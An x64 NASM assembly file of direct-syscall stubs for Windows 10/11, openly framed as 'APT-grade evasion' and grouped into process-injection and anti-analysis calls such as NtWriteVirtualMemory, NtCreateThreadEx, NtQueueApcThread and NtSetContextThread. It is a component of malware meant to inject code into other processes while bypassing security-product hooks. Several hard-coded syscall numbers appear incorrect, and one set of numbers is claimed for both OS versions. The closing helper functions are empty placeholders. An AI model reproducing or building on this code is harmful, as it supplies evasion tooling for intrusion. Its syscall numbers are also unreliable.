
; x64 Assembly for direct syscalls (Windows 10/11 x64) - Updated for APT-grade evasion
; Syscall numbers from Windows 10 22H2 (Build 19045) / Windows 11 22H2 (Build 22621)
; Reference: https://j00ru.vexillium.org/syscalls/nt/64/ + manual verification
; NASM syntax, assemble with: nasm -f win64 syscalls.asm -o syscalls.obj

section .text

; ──────────────────────────────────────────────────────────────────────────────
; Core syscalls for process injection and memory operations
; ──────────────────────────────────────────────────────────────────────────────

global CallNtAllocateVirtualMemory
global CallNtProtectVirtualMemory
global CallNtWriteVirtualMemory
global CallNtCreateThreadEx
global CallNtOpenProcess
global CallNtQueueApcThread
global CallNtAlertResumeThread
global CallNtSuspendThread
global CallNtResumeThread
global CallNtGetContextThread
global CallNtSetContextThread

; ──────────────────────────────────────────────────────────────────────────────
; Advanced syscalls for evasion and anti-analysis
; ──────────────────────────────────────────────────────────────────────────────

global CallNtQueryInformationProcess
global CallNtSetInformationProcess
global CallNtQuerySystemInformation
global CallNtDelayExecution
global CallNtCreateUserProcess
global CallNtTerminateProcess

; ──────────────────────────────────────────────────────────────────────────────
; Syscall implementations (Windows 10 22H2 / Windows 11 22H2)
; ──────────────────────────────────────────────────────────────────────────────

; NTSTATUS CallNtAllocateVirtualMemory(
;   HANDLE ProcessHandle,
;   PVOID *BaseAddress,
;   ULONG_PTR ZeroBits,
;   PSIZE_T RegionSize,
;   ULONG AllocationType,
;   ULONG Protect
; );
CallNtAllocateVirtualMemory:
    mov r10, rcx        ; First arg (syscall convention: r10 = rcx)
    mov eax, 0x18       ; NtAllocateVirtualMemory syscall number (Win10/11 22H2)
    syscall
    ret

; NTSTATUS CallNtProtectVirtualMemory(
;   HANDLE ProcessHandle,
;   PVOID *BaseAddress,
;   PSIZE_T NumberOfBytesToProtect,
;   ULONG NewAccessProtection,
;   PULONG OldAccessProtection
; );
CallNtProtectVirtualMemory:
    mov r10, rcx
    mov eax, 0x50       ; NtProtectVirtualMemory
    syscall
    ret

; NTSTATUS CallNtWriteVirtualMemory(
;   HANDLE ProcessHandle,
;   PVOID BaseAddress,
;   PVOID Buffer,
;   ULONG NumberOfBytesToWrite,
;   PULONG NumberOfBytesWritten
; );
CallNtWriteVirtualMemory:
    mov r10, rcx
    mov eax, 0x3A       ; NtWriteVirtualMemory
    syscall
    ret

; NTSTATUS CallNtCreateThreadEx(
;   PHANDLE ThreadHandle,
;   ACCESS_MASK DesiredAccess,
;   POBJECT_ATTRIBUTES ObjectAttributes,
;   HANDLE ProcessHandle,
;   PVOID StartRoutine,
;   PVOID Argument,
;   ULONG CreateFlags,
;   SIZE_T ZeroBits,
;   SIZE_T StackSize,
;   SIZE_T MaximumStackSize,
;   PPS_ATTRIBUTE_LIST AttributeList
; );
CallNtCreateThreadEx:
    mov r10, rcx
    mov eax, 0xC6       ; NtCreateThreadEx (updated for Win10/11 22H2)
    syscall
    ret

; NTSTATUS CallNtOpenProcess(
;   PHANDLE ProcessHandle,
;   ACCESS_MASK DesiredAccess,
;   POBJECT_ATTRIBUTES ObjectAttributes,
;   PCLIENT_ID ClientId
; );
CallNtOpenProcess:
    mov r10, rcx
    mov eax, 0x26       ; NtOpenProcess
    syscall
    ret

; NTSTATUS CallNtQueueApcThread(
;   HANDLE ThreadHandle,
;   PPS_APC_ROUTINE ApcRoutine,
;   PVOID ApcArgument1,
;   PVOID ApcArgument2,
;   PVOID ApcArgument3
; );
CallNtQueueApcThread:
    mov r10, rcx
    mov eax, 0x42       ; NtQueueApcThread
    syscall
    ret

; NTSTATUS CallNtAlertResumeThread(
;   HANDLE ThreadHandle,
;   PULONG PreviousSuspendCount
; );
CallNtAlertResumeThread:
    mov r10, rcx
    mov eax, 0x24       ; NtAlertResumeThread
    syscall
    ret

; NTSTATUS CallNtSuspendThread(
;   HANDLE ThreadHandle,
;   PULONG PreviousSuspendCount
; );
CallNtSuspendThread:
    mov r10, rcx
    mov eax, 0x4B       ; NtSuspendThread
    syscall
    ret

; NTSTATUS CallNtResumeThread(
;   HANDLE ThreadHandle,
;   PULONG PreviousSuspendCount
; );
CallNtResumeThread:
    mov r10, rcx
    mov eax, 0x4C       ; NtResumeThread
    syscall
    ret

; NTSTATUS CallNtGetContextThread(
;   HANDLE ThreadHandle,
;   PCONTEXT Context
; );
CallNtGetContextThread:
    mov r10, rcx
    mov eax, 0x32       ; NtGetContextThread
    syscall
    ret

; NTSTATUS CallNtSetContextThread(
;   HANDLE ThreadHandle,
;   PCONTEXT Context
; );
CallNtSetContextThread:
    mov r10, rcx
    mov eax, 0x3E       ; NtSetContextThread
    syscall
    ret

; ──────────────────────────────────────────────────────────────────────────────
; Anti-analysis and evasion syscalls
; ──────────────────────────────────────────────────────────────────────────────

; NTSTATUS CallNtQueryInformationProcess(
;   HANDLE ProcessHandle,
;   PROCESSINFOCLASS ProcessInformationClass,
;   PVOID ProcessInformation,
;   ULONG ProcessInformationLength,
;   PULONG ReturnLength
; );
CallNtQueryInformationProcess:
    mov r10, rcx
    mov eax, 0x19       ; NtQueryInformationProcess
    syscall
    ret

; NTSTATUS CallNtSetInformationProcess(
;   HANDLE ProcessHandle,
;   PROCESSINFOCLASS ProcessInformationClass,
;   PVOID ProcessInformation,
;   ULONG ProcessInformationLength
; );
CallNtSetInformationProcess:
    mov r10, rcx
    mov eax, 0x21       ; NtSetInformationProcess
    syscall
    ret

; NTSTATUS CallNtQuerySystemInformation(
;   SYSTEM_INFORMATION_CLASS SystemInformationClass,
;   PVOID SystemInformation,
;   ULONG SystemInformationLength,
;   PULONG ReturnLength
; );
CallNtQuerySystemInformation:
    mov r10, rcx
    mov eax, 0x36       ; NtQuerySystemInformation
    syscall
    ret

; NTSTATUS CallNtDelayExecution(
;   BOOLEAN Alertable,
;   PLARGE_INTEGER DelayInterval
; );
CallNtDelayExecution:
    mov r10, rcx
    mov eax, 0x34       ; NtDelayExecution
    syscall
    ret

; NTSTATUS CallNtCreateUserProcess(
;   PHANDLE ProcessHandle,
;   PHANDLE ThreadHandle,
;   ACCESS_MASK ProcessDesiredAccess,
;   ACCESS_MASK ThreadDesiredAccess,
;   POBJECT_ATTRIBUTES ProcessObjectAttributes,
;   POBJECT_ATTRIBUTES ThreadObjectAttributes,
;   ULONG ProcessFlags,
;   ULONG ThreadFlags,
;   PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
;   PPS_CREATE_INFO CreateInfo,
;   PPS_ATTRIBUTE_LIST AttributeList
; );
CallNtCreateUserProcess:
    mov r10, rcx
    mov eax, 0xBA       ; NtCreateUserProcess (for advanced process creation)
    syscall
    ret

; NTSTATUS CallNtTerminateProcess(
;   HANDLE ProcessHandle,
;   NTSTATUS ExitStatus
; );
CallNtTerminateProcess:
    mov r10, rcx
    mov eax, 0x2C       ; NtTerminateProcess
    syscall
    ret

; ──────────────────────────────────────────────────────────────────────────────
; Helper functions for syscall retrieval and dynamic execution
; ──────────────────────────────────────────────────────────────────────────────

global GetSyscallNumber
global DynamicSyscallStub

; Get syscall number by function hash (simplified version)
; Input: RDI = function hash
; Output: RAX = syscall number (or 0 if not found)
GetSyscallNumber:
    ; This would normally search ntdll.dll for the syscall number
    ; For now, return a placeholder implementation
    xor eax, eax
    ret

; Dynamic syscall stub generator
; Input: RCX = syscall number
; Output: RAX = pointer to generated stub
DynamicSyscallStub:
    ; Generate a syscall stub dynamically
    ; This would allocate executable memory and write syscall instructions
    ; For now, return null
    xor eax, eax
    ret
